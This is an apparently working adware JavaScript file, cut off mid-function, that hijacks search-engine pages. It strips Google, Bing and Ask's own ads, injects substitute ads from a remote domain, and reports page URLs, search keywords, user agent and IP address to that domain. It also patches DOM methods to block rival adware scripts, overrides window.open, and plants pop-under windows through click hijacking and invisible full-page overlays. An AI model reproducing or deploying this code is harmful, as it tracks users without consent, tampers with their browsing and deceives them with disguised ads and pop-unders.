(function() {
    var a = {
        dc: 'Aa865780bfe3e8a8f-0-FS-AU',
        dc_product_name: '',
        dc_product_link: '',
        jquery_url: '//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.js',
        get_data_url: '//aa9bd78f328a6a41279d0fad0a88df1901.com/data/init',
        s_m: 'true',
        debug: false,
        products: {
            modules: ['di', 'mt', 'sl']
        }
    };
    var b = {
        google: {
            domain: 'www.google.',
            ads_container_css: {
                'border-bottom': '1px solid #ebebeb',
                'margin-left': '-10px',
                'margin-bottom': '10px',
                'margin-top': '10px',
                'font-family': 'arial,sans-serif'
            },
            results_container_css: {
                'margin-top': '10px',
                'margin-bottom': '10px',
                'font-family': 'arial,sans-serif'
            },
            ads_containers: ['#taw', '#mbEnd', '#bottomads'],
            upper_container: '.mrlm_se_ads_upper',
            bottom_container: '.mrlm_se_ads_bottom',
            side_container: '#rhs_block',
            main_container: '#search',
            results_container: '#rso',
            search_input: '#lst-ib'
        },
        bing: {
            domain: 'www.bing.',
            ads_container_css: {
                'background-color': '#FFF7ED',
                'margin-bottom': '10px',
                'margin-left': '-5px',
                'margin-top': '10px'
            },
            results_container_css: {
                'margin-top': '20px',
                'margin-bottom': '20px'
            },
            ads_containers: ['.b_ad'],
            upper_container: '.mrlm_se_ads_upper',
            bottom_container: '.mrlm_se_ads_bottom',
            side_container: '',
            main_container: '#results, #b_results',
            results_container: '#wg0',
            search_input: '#sb_form_q'
        },
        ask: {
            domain: '.ask.',
            ads_container_css: {
                'background-color': '#FFF7ED',
                'margin-bottom': '10px'
            },
            results_container_css: {
                'margin-top': '10px',
                'margin-bottom': '10px'
            },
            ads_containers: ['#csaTop', '#csaBottom'],
            upper_container: '.mrlm_se_ads_upper',
            bottom_container: '.mrlm_se_ads_bottom',
            main_container: '#midblock',
            side_container: '',
            results_container: '#lindm',
            search_input: '#top_q_comm'
        },
        whitesmoke: {
            domain: 'search.whitesmoke',
            ads_container_css: {
                'background-color': '#FFF7ED',
                'margin-bottom': '10px'
            },
            results_container_css: {},
            ads_containers: ['.c'],
            upper_container: '.mrlm_se_ads_upper',
            bottom_container: '.mrlm_se_ads_bottom',
            main_container: '.b table tbody',
            side_container: '',
            results_container: '',
            search_input: '#q'
        },
        thesmartsearch: {
            domain: 'thesmartsearch',
            ads_container_css: {
                'border-bottom': '1px solid #ebebeb',
                'margin-left': '-10px',
                'margin-bottom': '10px',
                'margin-top': '10px',
                'font-family': 'arial,sans-serif'
            },
            results_container_css: {
                'margin-top': '10px',
                'margin-bottom': '10px',
                'font-family': 'arial,sans-serif'
            },
            ads_containers: ['div.north-ads'],
            upper_container: '.mrlm_se_ads_upper',
            bottom_container: '.mrlm_se_ads_bottom',
            side_container: '#right-content',
            main_container: 'table.container-table td.middle',
            results_container: 'table.container-table td.middle',
            search_input: '#searchbox_textfield'
        }
    };
    var c = function(a, b) {
        a = a.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
        var c = "[\\?&]" + a + "=([^&#]*)";
        var d = new RegExp(c);
        var e = d.exec(b);
        return e == null ? null : e[1];
    };
    var d = function(c, d) {
        var e = {
            max_results: 10,
            adult_filter: 'no',
            min_bid: 0.0,
            remove_original_ads: true
        };
        var g = c.keyword;
        var h = function(b, d, f) {
            if (!b || b === '') {
                f({
                    results: []
                });
                return;
            }
            var g = a.dc;
            var h = g.substr(0, 6) + 'SE' + g.substr(8);
            c.jquery.ajax({
                type: 'GET',
                data: {
                    d: h,
                    i: e.min_bid,
                    l: e.max_results,
                    u: encodeURI(b),
                    ua: encodeURI(c.server_data.ui.ua),
                    ip: c.server_data.ui.ip,
                    at: "se",
                    jp: 1
                },
                url: d,
                dataType: 'jsonp',
                cache: false,
                success: function(a) {
                    f(a);
                }
            });
        };
        var i = function(a, b) {
            c.jquery('.mrlm_se_ads_upper').remove();
            c.jquery('.mrlm_se_ads_bottom').remove();
            c.jquery('.mrlm_se_ads').remove();
            c.jquery('.mrlm_se_results').remove();
            if (a.results.length === 0) return;
            if (e.remove_original_ads)
                for (var d = 0; d < b.ads_containers.length; d++) c.jquery(b.ads_containers[d]).remove();
            var h = c.jquery('<div></div>').attr('class', 'mrlm_se_ads').attr('mrlm_product', 'se_ads').attr('mrlm_type', c.server_data.di.type).css(b.ads_container_css);
            var i = c.jquery('<div></div>').attr('class', 'mrlm_se_ads').attr('mrlm_product', 'se_ads').attr('mrlm_type', c.server_data.di.type).css(b.ads_container_css);
            var j = c.jquery('<div></div>').attr('class', 'mrlm_se_ads').attr('mrlm_product', 'se_ads').attr('mrlm_type', c.server_data.di.type).css(b.ads_container_css).css({
                'width': '262px',
                'margin-bottom': '100px'
            });
            var k = c.jquery('<span></span>').css('font-weight', 'bolder').css('color', '#5F5F5F').text(g);
            var l = c.jquery('<div></div>').css('font-size', '13px').css('font-weight', 'normal').css('color', '#666666').css('position', 'relative').css('left', '8px').css('top', '6px').text('Ads related to ');
            l.append(k);
            var m = a.results.length;
            if (b.domain.indexOf('google') == -1) h.append(l);
            for (var d = 0; d < m; d++) {
                var n = a.results[d].url.replace(/.*?:\/\//g, "");
                var o = g.split(' ');
                var p = f.highlight_words_in_text(c, a.results[d].title, o);
                var q = f.highlight_words_in_text(c, n, o);
                var r = f.highlight_words_in_text(c, a.results[d].description, o);
                var s = c.jquery('<div></div>').css('margin-top', '11px').css('margin-bottom', '11px').css('margin-left', '8px');
                var t = c.jquery('<a></a>').css('color', '#2518B5').css('cursor', 'pointer').css('font-size', 'medium').css('font-weight', 'regular').css('line-height', '1.2').css('font-family', 'arial,sans-serif').attr('target', 'seclk').attr('nopop', 1).attr('href', a.results[d].redirect).html(p);
                var u = c.jquery('<div></div>').css('color', '#00802A').css('font-style', 'normal').css('font-size', '14px').css('line-height', '1.2').css('margin-top', '1px').html(q);
                var v = c.jquery('<div></div>').html(r);
                if (b.domain.indexOf('google') != -1) {
                    q = '<span style="background-color:#edb802; border-radius:2px; color:#fff; font-size:13px; padding-right:3px; padding-left:3px; margin-right:7px;">Ad</span>';
                    u.prepend(q);
                    v.css({
                        'color': '#545454',
                        'line-height': '18px',
                        'font-size': 'small'
                    });
                }
                s.append(t);
                s.append(u);
                s.append(v);
                if (d <= 2) h.append(s);
                else if (d >= 5) {
                    i.append(s);
                    j.append(s.clone());
                }
            }
            var w = c.jquery('<div></div>').attr('class', f.replace_all(b.upper_container, '.', ' '));
            var x = c.jquery('<div></div>').attr('class', f.replace_all(b.bottom_container, '.', ' '));
            c.jquery(b.main_container).prepend(w);
            c.jquery(b.main_container).append(x);
            c.jquery(b.upper_container).append(h.clone());
            if (b.side_container != "") c.jquery(b.side_container).prepend(j);
            if (m > 5) c.jquery(b.bottom_container).append(i);
            else c.jquery(b.bottom_container).append(h.clone());
        };
        var j = function(a, b) {
            if (a.results.length === 0) return;
            var d = 0;
            var e = a.results.length;
            if (e > 3) {
                d = 3;
                e = 2;
            }
            for (var h = d; h < d + e; h++) {
                var i = g.split(' ');
                var j = f.highlight_words_in_text(c, a.results[h].title, i);
                var k = f.highlight_words_in_text(c, a.results[h].url, i);
                var l = f.highlight_words_in_text(c, a.results[h].description, i);
                var m = c.jquery('<div></div>').attr('class', 'mrlm_se_results').attr('mrlm_product', 'mrlm_se_results').attr('mrlm_type', c.server_data.di.type).css(b.results_container_css);
                var n = c.jquery('<a></a>').css('font-size', 'medium').css('text-decoration', 'underline').attr('nopop', 1).attr('href', a.results[h].redirect).html(j);
                var o = c.jquery('<div></div>').css('color', '#00802A').css('font-style', 'normal').css('font-size', '14px').css('line-height', '1.2').html(k);
                var p = c.jquery('<div></div>').css('font-size', 'small').css('margin-top', '1px').html(l);
                if (b.domain.indexOf('google') != -1) {
                    n.css({
                        'font-size': '18px',
                        'text-decoration': ''
                    });
                    o.css({
                        'font-weight': 'arial,sans-serif',
                        'line-height': '16px',
                        'font-style': 'normal',
                        'font-size': '13px'
                    });
                    p.css({
                        'color': '#545454',
                        'line-height': '18px',
                        'font-size': 'small',
                        'font-weight': 'arial,sans-serif'
                    });
                }
                m.append(n);
                m.append(o);
                m.append(p);
                c.jquery(b.results_container).prepend(m);
            }
        };
        var k = function() {
            for (var a in b)
                if (window.location.host.indexOf(b[a].domain) != -1) l(b[a]);
        };
        var l = function(a) {
            var b = function() {
                var b = c.jquery(a.search_input).val();
                var e = c.jquery('#mrlm_blank').length;
                if (b != g || e === 0) {
                    if (e === 0)
                        if (c.jquery(a.main_container).length > 0) c.jquery(a.main_container).append(c.jquery('<div></div>').attr('id', 'mrlm_blank').css('display', 'none'));
                    g = b;
                    if (g !== null && typeof g != "undefined" && g.trim().length >= 3) h(b, d, function(b) {
                        if (b.results.length > 0) i(b, a);
                    });
                }
            };
            if (c.jquery('div.commercial-unit').length > 0) c.jquery('div.commercial-unit').hide();
            b();
            setInterval(function() {
                b();
            }, 1000);
        };
        k();
    };
    var e = function(b) {
        try {
            window.getjs_212888 = true;
            var d = f.get_frame_data();
            if (d.iframes > 0) return;
            if (window.opener != null)
                if (window.name.indexOf('mmpopunder') >= 0)
                    if (a.dc_product_name != null && a.dc_product_name != "") {
                        var e = document.createElement('div');
                        e.style.position = 'fixed';
                        e.style.zIndex = 99999;
                        e.style.top = '0px';
                        e.style.right = '0px';
                        e.style.height = '12px';
                        e.style.fontSize = '8px';
                        e.style.padding = '2px';
                        e.style.backgroundColor = 'rgba(255,255,255,0.5)';
                        e.style.color = 'black';
                        e.style.fontWeight = 'bold';
                        if (a.dc_product_link != null && a.dc_product_link != "") e.innerHTML = '<a style="color:black" target="_blank" href="' + a.dc_product_link + '">Powered By ' + a.dc_product_name + '</a>';
                        else e.innerHTML = 'Powered By ' + a.dc_product_name;
                        document.body.appendChild(e);
                    }
        } catch (g) {}
        try {
            var h = window.navigator.userAgent;
            var i = h.indexOf("MSIE ");
            if (i == -1) {
                Element.prototype.appendChild = document.appendChild;
                Element.prototype.insertBefore = document.insertBefore;
            }
        } catch (g) {}
        try {
            window.open = function(a) {
                return function(b, c, d) {
                    if (d == undefined) return a.call(window, b, c, d);
                    var e = d.split(',');
                    var f = null;
                    var g = null;
                    for (var h = 0; h < e.length; h++) {
                        if (e[h].split('=')[0] == 'width') f = parseInt(e[h].split('=')[1]);
                        if (e[h].split('=')[0] == 'height') g = parseInt(e[h].split('=')[1]);
                    }
                    if (f == null || g == null) return;
                    if (b.indexOf('google') >= 0) return a.call(window, b, c, d);
                    else if (c.indexOf('mmpopunder') >= 0 || f < 800 || g < 600) return a.call(window, b, c);
                };
            }(window.open);
            var j = ['Cinema', 'apollocdn.com', 'boostsaves.com', 'datafastguru', 'simpli.fi', 'donation-tools.org', 'ggpht', 'savingsslider', 'shopathome_tag', 'crbfmcjs_info', 'fututbjs.info', 'ArcadeYum', 'tfxiq.com', 'PallMall', 'FlashMall', 'Shopy', 'BuyNsave', 'Couponarific', 'AllDaySaving', 'WorldWideWebCoupon', 'CheapCoupon', 'ProShopper', 'TinyWallet', 'SmartCompare', 'WowCoupon', 'dealpeak', 'crdrdpjs', 'OnlineLowDeals', 'UltraCoupon', 'MinimumPrice', 'savingtoyou', 'ExtraShopper', 'BlockAndSurf', 'AllSaver', 'MinimumPrice'];
            var k = ['data/init', 'get-js', 'jquery.js', 'google', 'utop.it', 'log-event', 'as/gf', 'cttsrv', '/mu'];
            var l = Element.prototype.appendChild;
            var m = Element.prototype.insertBefore;
            var n = function() {
                return p(l, this, arguments);
            };
            var o = function() {
                return p(m, this, arguments);
            };
            var p = function(a, b, c) {
                var d = true;
                var e = "";
                if (b.tagName == 'HEAD' || b.tagName == 'BODY')
                    for (var f in c)
                        if (c[f] != null && c[f].tagName != null && (c[f].tagName == 'SCRIPT' || c[f].tagName == 'IFRAME') && c[f].src != null)
                            for (var g in j)
                                if (c[f].src.indexOf(j[g]) > 0) {
                                    d = false;
                                    break;
                                } else {}
                if (d) return a.apply(b, c);
            };
            Element.prototype.appendChild = n;
            Element.prototype.insertBefore = o;
        } catch (g) {}
        var q = {
            jquery: null,
            domain_info: null,
            keyword: null,
            server_data: null,
            is_pop: false,
            is_local: false,
            is_pop_opened: false,
            log: ""
        };
        var r = function(b, d) {
            var e = "";
            var f = "";
            var g = "";
            var h = "";
            var i = "";
            if ((window.name.indexOf('mmpopunder') >= 0 || window.name.indexOf('seclk') >= 0 || window.name.indexOf('InterYield') >= 0 || document.URL.indexOf('easytobook') >= 0) && window.name.indexOf('-_gp') < 0) {
                b.is_pop = true;
                var j = window.name.split('_-_');
                if (j.length == 2) {
                    pop_prov_parts = j[1].split('|');
                    if (pop_prov_parts.length == 5) {
                        e = pop_prov_parts[0];
                        f = pop_prov_parts[1];
                        g = pop_prov_parts[2];
                        h = pop_prov_parts[3];
                        i = pop_prov_parts[4];
                    }
                }
            }
            var k = "";
            if (a.dc.match("^DP")) var l = b.jquery('script[src*=get-js]');
            else if (a.dc.match("^A")) var l = b.jquery('script[src*=mu]');
            var m = "";
            if (l != null) {
                var k = l.attr('src');
                var n = c('id', k);
                var o = c('inst_id', k);
                if (n != null) m = n;
                if (m == "" && o != null) m = o;
            }
            b.jquery.ajax({
                type: 'GET',
                data: {
                    uid: m,
                    dc: a.dc,
                    page_url: encodeURI(document.location.href),
                    keyword: encodeURI(b.keyword),
                    modules: a.products.modules.join(','),
                    ref: e,
                    popb: f,
                    purl: encodeURI(g),
                    popourl: encodeURI(h),
                    pstmp: i,
                    is_pop: b.is_pop
                },
                url: a.get_data_url,
                dataType: 'jsonp',
                cache: false,
                success: function(a) {
                    d(a);
                }
            });
            if (window.name.indexOf('InterYield') >= 0) b.is_pop = true;
        };
        var s = function(a) {
            for (var b in a) {
                var c = a[b];
                if (c.constructor == Object) s(c);
                if (typeof c != 'string') continue;
                c = c.replace('dfwu1009.info', '127.0.0.1:5000');
                a[b] = c;
            }
        };
        var t = function(a) {
            (function(a) {
                a.fn.bPopup = function(b, c) {
                    function d() {
                        p.contentContainer = a(p.contentContainer || q);
                        switch (p.content) {
                            case "iframe":
                                var b = a('<iframe class="b-iframe" ' + p.iframeAttr + "></iframe>");
                                b.appendTo(p.contentContainer);
                                G = q.outerHeight(!0);
                                H = q.outerWidth(!0);
                                e();
                                b.attr("src", p.loadUrl);
                                m(p.loadCallback);
                                break;
                            case "image":
                                e();
                                a("<img />").load(function() {
                                    m(p.loadCallback);
                                    g(a(this));
                                }).attr("src", p.loadUrl).hide().appendTo(p.contentContainer);
                                break;
                            default:
                                e(), a('<div class="b-ajax-wrapper"></div>').load(p.loadUrl, p.loadData, function() {
                                    m(p.loadCallback);
                                    g(a(this));
                                }).hide().appendTo(p.contentContainer);
                        }
                    }

                    function e() {
                        p.modal && a('<div class="b-modal ' + z + '"></div>').css({
                            backgroundColor: p.modalColor,
                            position: "fixed",
                            top: 0,
                            right: 0,
                            bottom: 0,
                            left: 0,
                            opacity: 0,
                            zIndex: p.zIndex + y
                        }).appendTo(p.appendTo).fadeTo(p.speed, p.opacity);
                        n();
                        q.data("bPopup", p).data("id", z).css({
                            left: "slideIn" == p.transition || "slideBack" == p.transition ? "slideBack" == p.transition ? r.scrollLeft() + v : -1 * (F + H) : k(!(!p.follow[0] && C || D)),
                            position: p.positionStyle || "absolute",
                            top: "slideDown" == p.transition || "slideUp" == p.transition ? "slideUp" == p.transition ? r.scrollTop() + u : E + -1 * G : l(!(!p.follow[1] && B || D)),
                            "z-index": p.zIndex + y + 1
                        }).each(function() {
                            p.appending && a(this).appendTo(p.appendTo);
                        });
                        i(!0);
                    }

                    function f() {
                        p.modal && a(".b-modal." + q.data("id")).fadeTo(p.speed, 0, function() {
                            a(this).remove();
                        });
                        p.scrollBar || a("html").css("overflow", "auto");
                        a(".b-modal." + z).unbind("click");
                        r.unbind("keydown." + z);
                        t.unbind("." + z).data("bPopup", 0 < t.data("bPopup") - 1 ? t.data("bPopup") - 1 : null);
                        q.undelegate(".bClose, ." + p.closeClass, "click." + z, f).data("bPopup", null);
                        i();
                        return !1;
                    }

                    function g(a) {
                        var b = a.width(),
                            c = a.height(),
                            d = {};
                        p.contentContainer.css({
                            height: c,
                            width: b
                        });
                        c >= q.height() && (d.height = q.height());
                        b >= q.width() && (d.width = q.width());
                        G = q.outerHeight(!0);
                        H = q.outerWidth(!0);
                        n();
                        p.contentContainer.css({
                            height: "auto",
                            width: "auto"
                        });
                        d.left = k(!(!p.follow[0] && C || D));
                        d.top = l(!(!p.follow[1] && B || D));
                        q.animate(d, 250, function() {
                            a.show();
                            A = o();
                        });
                    }

                    function h() {
                        t.data("bPopup", y);
                        q.delegate(".bClose, ." + p.closeClass, "click." + z, f);
                        p.modalClose && a(".b-modal." + z).css("cursor", "pointer").bind("click", f);
                        w || !p.follow[0] && !p.follow[1] || t.bind("scroll." + z, function() {
                            A && q.dequeue().animate({
                                left: p.follow[0] ? k(!D) : "auto",
                                top: p.follow[1] ? l(!D) : "auto"
                            }, p.followSpeed, p.followEasing);
                        }).bind("resize." + z, function() {
                            u = s.innerHeight || t.height();
                            v = s.innerWidth || t.width();
                            if (A = o()) clearTimeout(I), I = setTimeout(function() {
                                n();
                                q.dequeue().each(function() {
                                    D ? a(this).css({
                                        left: F,
                                        top: E
                                    }) : a(this).animate({
                                        left: p.follow[0] ? k(!0) : "auto",
                                        top: p.follow[1] ? l(!0) : "auto"
                                    }, p.followSpeed, p.followEasing);
                                });
                            }, 50);
                        });
                        p.escClose && r.bind("keydown." + z, function(a) {
                            27 == a.which && f();
                        });
                    }

                    function i(a) {
                        function b(b) {
                            q.css({
                                display: "block",
                                opacity: 1
                            }).animate(b, p.speed, p.easing, function() {
                                j(a);
                            });
                        }
                        switch (a ? p.transition : p.transitionClose || p.transition) {
                            case "slideIn":
                                b({
                                    left: a ? k(!(!p.follow[0] && C || D)) : r.scrollLeft() - (H || q.outerWidth(!0)) - x
                                });
                                break;
                            case "slideBack":
                                b({
                                    left: a ? k(!(!p.follow[0] && C || D)) : r.scrollLeft() + v + x
                                });
                                break;
                            case "slideDown":
                                b({
                                    top: a ? l(!(!p.follow[1] && B || D)) : r.scrollTop() - (G || q.outerHeight(!0)) - x
                                });
                                break;
                            case "slideUp":
                                b({
                                    top: a ? l(!(!p.follow[1] && B || D)) : r.scrollTop() + u + x
                                });
                                break;
                            default:
                                q.stop().fadeTo(p.speed, a ? 1 : 0, function() {
                                    j(a);
                                });
                        }
                    }

                    function j(a) {
                        a ? (h(), m(c), p.autoClose && setTimeout(f, p.autoClose)) : (q.hide(), m(p.onClose), p.loadUrl && (p.contentContainer.empty(), q.css({
                            height: "auto",
                            width: "auto"
                        })));
                    }

                    function k(a) {
                        return a ? F + r.scrollLeft() : F;
                    }

                    function l(a) {
                        return a ? E + r.scrollTop() : E;
                    }

                    function m(b) {
                        a.isFunction(b) && b.call(q);
                    }

                    function n() {
                        E = B ? p.position[1] : Math.max(0, (u - q.outerHeight(!0)) / 2 - p.amsl);
                        F = C ? p.position[0] : (v - q.outerWidth(!0)) / 2;
                        A = o();
                    }

                    function o() {
                        return u > q.outerHeight(!0) && v > q.outerWidth(!0);
                    }
                    a.isFunction(b) && (c = b, b = null);
                    var p = a.extend({}, a.fn.bPopup.defaults, b);
                    p.scrollBar || a("html").css("overflow", "hidden");
                    var q = this,
                        r = a(document),
                        s = window,
                        t = a(s),
                        u = s.innerHeight || t.height(),
                        v = s.innerWidth || t.width(),
                        w = /OS 6(_\d)+/i.test(navigator.userAgent),
                        x = 200,
                        y = 0,
                        z, A, B, C, D, E, F, G, H, I;
                    q.close = function() {
                        p = this.data("bPopup");
                        z = "__b-popup" + t.data("bPopup") + "__";
                        f();
                    };
                    return q.each(function() {
                        a(this).data("bPopup") || (m(p.onOpen), y = (t.data("bPopup") || 0) + 1, z = "__b-popup" + y + "__", B = "auto" !== p.position[1], C = "auto" !== p.position[0], D = "fixed" === p.positionStyle, G = q.outerHeight(!0), H = q.outerWidth(!0), p.loadUrl ? d() : e());
                    });
                };
                a.fn.bPopup.defaults = {
                    amsl: 50,
                    appending: !0,
                    appendTo: "body",
                    autoClose: !1,
                    closeClass: "b-close",
                    content: "ajax",
                    contentContainer: !1,
                    easing: "swing",
                    escClose: !0,
                    follow: [!0, !0],
                    followEasing: "swing",
                    followSpeed: 500,
                    iframeAttr: 'scrolling="no" frameborder="0"',
                    loadCallback: !1,
                    loadData: !1,
                    loadUrl: !1,
                    modal: !0,
                    modalClose: !0,
                    modalColor: "#000",
                    onClose: !1,
                    onOpen: !1,
                    opacity: 0.7,
                    position: ["auto", "auto"],
                    positionStyle: "absolute",
                    scrollBar: !0,
                    speed: 250,
                    transition: "fadeIn",
                    transitionClose: !1,
                    zIndex: 9997
                };
            })(a.jquery);
        };
        if (a.debug) s(a);
        if (window.jQuery) f.log('debug', 'page jquery: ' + window.jQuery.fn.jquery);
        else f.log('debug', 'no page jquery found');
        f.load_script(a.jquery_url, function() {
            q.jquery = jQuery.noConflict(true);
            f.log('debug', 'mrlm jquery: ' + q.jquery.fn.jquery);
            q.keyword = "";
            if (q.keyword == "" && q.jquery("meta[name='keywords']").length > 0 && q.jquery("meta[name='keywords']").attr("content") != null) q.keyword = q.jquery("meta[name='keywords']").attr("content");
            if (q.keyword == "" && q.jquery("meta[name='description']").length > 0 && q.jquery("meta[name='description']").attr("content") != null) q.keyword = q.jquery("meta[name='description']").attr("content");
            if (q.keyword == "" && q.jquery("meta[name='description']").length > 0 && q.jquery("meta[name='description']").attr("value") != null) q.keyword = q.jquery("meta[name='description']").attr("value");
            if (q.keyword == "" && document.title != null) q.keyword = document.title;
            if (q.keyword != null) q.keyword = q.keyword.substring(0, 1024);
            t(q);
            r(q, function(a) {
                if (a.error != null) f.log('debug', 'get-data failed, error: ' + a.error);
                else {
                    f.log('debug', 'di: ' + f.json().stringify(a.di));
                    f.log('debug', 'mt: ' + f.json().stringify(a.mt));
                    f.log('debug', 'sl: ' + f.json().stringify(a.sl));
                }
                q.server_data = a;
                b(q);
            });
        });
    };
    var f = {
        log: function(b, c) {
            if (a.debug) console[b](new Date().getTime() + ' mrlm: ' + c);
        },
        set_cookie: function(a, b, c) {
            if (c) {
                var d = new Date();
                d.setTime(d.getTime() + (c * 24 * 60 * 60 * 1000));
                var e = "; expires=" + d.toGMTString();
            } else var e = "";
            document.cookie = a + "=" + b + e + "; path=/";
        },
        get_cookie: function(a) {
            if (document.cookie.length > 0) {
                var b = document.cookie.indexOf(a + "=");
                if (b != -1) {
                    b = b + a.length + 1;
                    var c = document.cookie.indexOf(";", b);
                    if (c == -1) c = document.cookie.length;
                    return decodeURI(document.cookie.substring(b, c));
                }
            }
            return "";
        },
        load_script: function(a, b) {
            var c, d, e;
            d = false;
            c = document.createElement('script');
            c.type = 'text/javascript';
            c.src = a;
            c.onload = c.onreadystatechange = function() {
                if (!d && (!this.readyState || this.readyState == 'complete')) {
                    d = true;
                    if (b) b();
                }
            };
            e = document.getElementsByTagName('script')[0];
            e.parentNode.insertBefore(c, e);
        },
        pop_under: function(a, b, c, d, e) {
            e = typeof e !== 'undefined' ? e : "";
            var f = {
                name: "mmpopunder",
                width: c ? c : screen.width,
                height: d ? d : screen.height,
                top: 0,
                left: 0,
                wait: 0,
                cap: 10,
                cookie: 'mmpopunder'
            };
            f.name += "_-_" + e;
            var g = (top != self && typeof(top.document.location.toString()) === 'string') ? top : self;
            var h = null;
            f = (f || {});
            var i = (f.name || Math.floor((Math.random() * 1000) + 1));
            var j = (f.width || window.outerWidth || window.innerWidth);
            var k = (f.height || (window.outerHeight - 100) || window.innerHeight);
            var l = (typeof(f.left) != 'undefined') ? f.left.toString() : window.screenX;
            var m = (typeof(f.top) != 'undefined') ? f.top.toString() : window.screenY;
            var n = (f.wait || 3600);
            n = (n * 1000);
            var o = false;
            var p = (f.cap || 2);
            var q = 0;
            var r = (f.cookie || '__.popunder');
            var s = function() {
                var a = navigator.userAgent.toLowerCase();
                var b = {
                    webkit: /webkit/.test(a),
                    mozilla: (/mozilla/.test(a)) && (!/(compatible|webkit)/.test(a)),
                    chrome: /chrome/.test(a),
                    msie: (/msie/.test(a)) && (!/opera/.test(a)),
                    firefox: /firefox/.test(a),
                    safari: (/safari/.test(a) && !(/chrome/.test(a))),
                    opera: /opera/.test(a)
                };
                b.version = (b.safari) ? (a.match(/.+(?:ri)[\/: ]([\d.]+)/) || [])[1] : (a.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/) || [])[1];
                return b;
            }();

            function t() {
                return false;
            }

            function u(a, b, c) {
                var d = document.createElement("a");
                d.href = a;
                d.target = b;
                var e = document.createEvent("MouseEvents");
                if (c == 'mac') e.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, true, 0, null);
                else e.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, true, false, false, false, 0, null);
                d.dispatchEvent(e);
            }

            function v(b, c, d, e, f, i) {
                if (t()) return;
                var j = 'toolbar=no,scrollbars=yes,location=yes,statusbar=yes,menubar=no,resizable=1,width=' + d.toString() + ',height=' + e.toString() + ',screenX=' + f + ',screenY=' + i;
                var k = function(f) {
                    var i = '86321022';
                    if (o || (f.target != null && f.target.getAttribute('nopop') != null && f.target.getAttribute('nopop') == 1)) return;
                    o = true;
                    if (t()) return;
                    if (c.indexOf('__gp') > 0) {
                        j = 'width=' + d.toString() + ',height=' + e.toString() + ',screenX=3000,screenY=3000';
                        h = window.open(b, "_blank", j);
                        window.focus();
                    } else {
                        h = g.window.open(b, c, j);
                        setTimeout(function() {
                            if (h == null || h.closed) {
                                var d = document.createElement('div');
                                d.id = "p_21213";
                                d.style.zIndex = 998;
                                d.style.position = 'fixed';
                                d.style.left = '-1px';
                                d.style.top = '-1px';
                                d.style.height = '100%';
                                d.style.width = '100%';
                                var e = '<a style="cursor:default" onClick="return pop_clicked_21213();" target="$WINDOW_NAME$" href="$URL$"><img src="//t.ct' + 'ptex.c' + 'om/transparent.gif" style="z-index:999;left:-1px;top:-1px;height:100%;width:100%"/></a>';
                                e = e.replace('$URL$', b);
                                e = e.replace('$WINDOW_NAME$', c);
                                d.innerHTML = e;
                                document.body.appendChild(d);
                                window.pop_clicked_21213 = function() {
                                    a.is_pop_opened = true;
                                    var b = document.getElementById('p_21213');
                                    b.parentNode.removeChild(b);
                                    return true;
                                };
                            }
                        }, 1000);
                    }
                    if (h) a.is_pop_opened = true;
                    else {}
                    return h;
                };
                if (document.addEventListener) document.addEventListener("click", k, false);
                else document.attachEvent("onclick", k);
            }

            function w() {
                try {
                    h.blur();
                    h.opener.window.focus();
                    window.self.window.focus();
                    window.focus();
                    if (s.firefox) x();
                    if (s.webkit) y();
                    if (s.msie) setTimeout(function() {
                        h.blur();
                        h.opener.window.focus();
                        window.self.window.focus();
                        window.focus();
                    }, 1000);
                } catch (a) {}
            }

            function x() {
                var a = window.open('about:blank');
                a.focus();
                a.close();
            }

            function y() {
                var a = '';
                var b = document.createElement("a");
                b.href = "data:text/html,<scr" + a + "ipt>window.close();</scr" + a + "ipt>";
                document.getElementsByTagName("body")[0].appendChild(b);
                var c = document.createEvent("MouseEvents");
                c.initMouseEvent("click", false, true, window, 0, 0, 0, 0, 0, true, false, false, true, 0, null);
                b.dispatchEvent(c);
                b.parentNode.removeChild(b);
            }
            if (t()) return;
            else {
                var z = v(b, i, j, k, l, m);
                return z;
            }
        },
        get_element_attributes: function(a, b) {
            var c = {};
            a.jquery.each(b.get(0).attributes, function(a, b) {
                c[b.name] = b.value;
            });
            return c;
        },
        wrap_iframe: function(a, b, c, d, e, f) {
            if (typeof f == 'undefined') f = {};
            var g = b.attr('mrlm_id');
            var h = a.jquery('<div></div>');
            var i = {
                'position': 'relative',
                'width': b[0].width,
                'height': b[0].height
            };
            h.attr({
                'id': g
            });
            h.attr(f);
            h.css(i);
            h.append(b);
            if (d != "") {
                var j = a.jquery('<div></div>');
                j.css({
                    'position': 'absolute',
                    'bottom': '0px',
                    'right': '0px',
                    'padding': '2px',
                    'background-color': 'rgba(255,255,255,0.6)',
                    'font-size': '8px',
                    'font-weight': 'bold',
                    'height': '12px'
                });
                j.html('<a style="color:black" target="_blank" href="' + e + '">Powered by ' + d + '</a>');
                h.append(j);
                if (c) {
                    var k = a.jquery('<div></div>');
                    k.attr({
                        'id': 'closeAd_' + g,
                        'ad-id': g
                    });
                    k.css({
                        'position': 'absolute',
                        'cursor': 'pointer',
                        'width': '12px',
                        ' height': '14px',
                        'text-align': 'center',
                        'top': '0px',
                        'right': '0px',
                        'padding-right': '0px',
                        'padding-bottom': '0px',
                        'background-color': 'rgba(255,255,255,0.6)',
                        'font-size': '10px',
                        'font-weight': 'bold'
                    });
                    k.html('X');
                    h.append(k);
                }
            }
            return h;
        },
        create_iframe: function(a, b, c, d, e, f, g) {
            var h = Math.floor(Math.random() * 100000000);
            var i = a.jquery('<iframe></iframe>');
            i.attr(f);
            i.attr({
                'frameborder': '0',
                'marginwidth': '0',
                'marginheight': '0',
                'scrolling': 'no',
                'width': d,
                'height': e,
                'mrlm_id': h,
                'mrlm_product': b,
                'mrlm_type': c,
                'src': g,
                '_target': 'blank'
            });
            return i;
        },
        show_slider: function(a, b, c, d) {
            window.bslider = context.jquery('<div />').attr({});
            window.bslider.css({
                'position': 'fixed',
                'z-index': 9999,
                'width': c + 'px',
                'height': d + 'px',
                'background-color': 'white'
            });
            switch (b) {
                case 'bottom':
                    {
                        var e = context.jquery(window).width();
                        var f = e / 2 - c / 2;window.bslider.css({
                            'bottom': (-1 * d) + 'px',
                            'left': f + 'px'
                        });
                    }
                    break;
                case 'left':
                    {
                        var g = context.jquery(window).height();
                        var h = g / 2 - d / 2;window.bslider.css({
                            'top': h + 'px',
                            'left': (-1 * c) + 'px'
                        });
                    }
                    break;
                default:
                    {}
            }
